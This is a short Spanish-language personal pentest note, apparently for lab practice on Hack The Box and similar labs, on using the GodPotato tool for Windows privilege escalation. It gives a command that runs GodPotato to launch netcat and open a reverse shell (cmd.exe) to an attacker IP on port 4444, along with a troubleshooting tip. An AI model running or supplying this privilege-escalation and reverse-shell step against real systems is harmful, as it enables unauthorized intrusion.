
## DESCRIPTION
Es una variante de ROGUE POTATO, si te falla todo lo demás prueba este, que suele funcionar.


#### Mas información
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
* https://github.com/BeichenDream/GodPotato


## EXPLOITATION

1. Subelo a la máquina [[TRANSFERRING FILES]]

2. Ejecutalo

```
./GodPotato1.exe -cmd "cmd /c c:\programdata\nc.exe -e cmd.exe 192.168.119.169 4444"
```

![[Pasted image 20230419205645.png]]


**!!NOTA IMPORTANTE!!** 
* Puede que funcione con errores al ejecutar comando por ejemplo `whoami` o cualquier ejecutables Pues no se por que pero se me ha solucionado ejecutando antes Rogue Potato, aunque no funcione:

Por ejemplo:
![[Pasted image 20230419205419.png]]

![[Pasted image 20230419205531.png]]

Tras ejecutarlo unas cuantas de veces:

![[Pasted image 20230419205611.png]]


## MACHINES

* Hack The Box: 
*  LABs: R

**!!NOTA IMPORTANTE!!** 